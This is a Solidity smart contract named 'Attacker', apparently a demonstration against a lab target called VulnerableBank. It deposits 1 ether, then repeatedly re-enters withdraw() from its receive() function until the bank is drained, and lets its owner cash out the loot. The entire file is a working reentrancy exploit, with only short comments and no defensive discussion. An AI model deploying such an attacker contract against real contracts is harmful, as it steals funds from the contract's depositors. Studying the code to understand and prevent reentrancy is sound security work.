// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

/// @title Attacker - drains VulnerableBank by re-entering withdraw()
contract Attacker {
    IBank public immutable bank;
    address public immutable owner;
    uint256 public reentries;

    constructor(address _bank) {
        bank = IBank(_bank);
        owner = msg.sender;
    }

    /// Send exactly 1 ether with this call
    function attack() external payable {
        require(msg.value == 1 ether, "Send exactly 1 ether");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    /// Called automatically every time the bank sends us ETH
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            reentries++;
            bank.withdraw(); // re-enter before the bank zeroes our balance
        }
    }

    function loot() external view returns (uint256) {
        return address(this).balance;
    }

    function cashOut() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
